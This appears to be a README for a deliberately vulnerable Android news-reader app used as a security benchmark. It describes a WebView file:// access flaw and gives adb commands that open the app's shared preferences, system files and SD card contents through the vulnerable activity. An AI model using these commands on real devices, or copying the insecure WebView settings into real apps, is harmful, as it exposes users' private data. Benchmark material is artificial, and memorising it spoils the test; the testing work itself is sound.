# oxo-android-ben42 News Reader App

## Attack Vector 4: File Scheme URL Access

**Vulnerability**: WebView allows loading file:// URLs with unrestricted file access, enabling attackers to access local files on the device, including sensitive app data or system files.

**Key Issues**:
- `setAllowFileAccess(true)` enabled
- `setAllowFileAccessFromFileURLs(true)` enabled  
- `setAllowUniversalAccessFromFileURLs(true)` enabled
- No restrictions on file:// URL loading
- Can access /data/data/ directories, SD card files, or system files

**Difficulty**: Medium

## Testing

```bash
# Test local file access - app's internal files
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///data/data/co.ostorlab.myapplication/shared_prefs/user_prefs.xml"

# Test system file access
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///system/etc/hosts"

# Test SD card access
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///sdcard/Download/"

# Test with legitimate-looking system health check that performs file access
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///android_asset/system_health_check.html"
```
